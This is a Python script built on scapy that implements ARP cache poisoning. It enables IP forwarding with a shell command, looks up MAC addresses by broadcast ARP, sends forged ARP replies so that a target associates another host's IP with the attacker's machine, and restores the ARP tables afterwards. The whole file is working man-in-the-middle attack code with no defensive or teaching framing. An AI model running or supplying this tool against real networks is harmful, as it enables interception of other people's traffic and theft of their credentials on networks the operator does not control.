import scapy.all as scapy
#import argparse
import time
import subprocess

ENABLE_FORWARDING = "echo 1 > /proc/sys/net/ipv4/ip_forward"
BROADCAST = "ff:ff:ff:ff:ff:ff"

def enable_ip_forwarding():
    subprocess.call(ENABLE_FORWARDING, shell=True)
    print("[+] IP forwarding enabled")


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst=BROADCAST)
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] #send a packet and recieve response
    result_mac = answered_list[0][1].hwsrc
    print(f"[+] MAC address for the requested IP[{ip}]: {result_mac}")
    return result_mac

"""     print("IP\t\t\t\tMAC Address")
    clients_list = []
    for item in answered_list:
        client_dict = {"ip" : item[1].psrc, 
                       "mac": item[1].hwsrc}
        print(f"{item[1].psrc}\t\t\t\{item[1].hwsrc}")
        clients_list.append(client_dict)
    return clients_list   """  


def spoof(target_ip, spoof_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    dest_mac = get_mac_address(dest_ip)
    src_mac = get_mac_address(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)    
    scapy.send(packet)